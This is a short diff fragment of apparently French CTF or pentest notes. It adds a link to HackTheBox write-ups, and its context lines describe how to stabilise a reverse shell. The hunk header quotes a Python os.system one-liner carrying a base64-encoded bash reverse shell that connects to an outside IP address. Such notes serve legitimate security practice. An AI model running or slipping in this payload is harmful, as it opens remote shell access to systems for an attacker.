@@ -194,3 +194,7 @@ __import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNy4yNT
 - 2.2.b sur BASH `stty raw -echo` <enter> puis `fg`
 - 2.3. dans le revshell, export de la variable TERM avec `export TERM=xterm`
 - 2.4. on se fait plaiz avec `alias ll="ls -alh --color"` et `alias grep="grep --color=always"` dans le revshell
+  
+  
+ # Write-up
+[  HackTheBox-CTF-Writeups/README.md at master · Ignitetechnologies/HackTheBox-CTF-Writeups · GitHub](https://github.com/Ignitetechnologies/HackTheBox-CTF-Writeups)
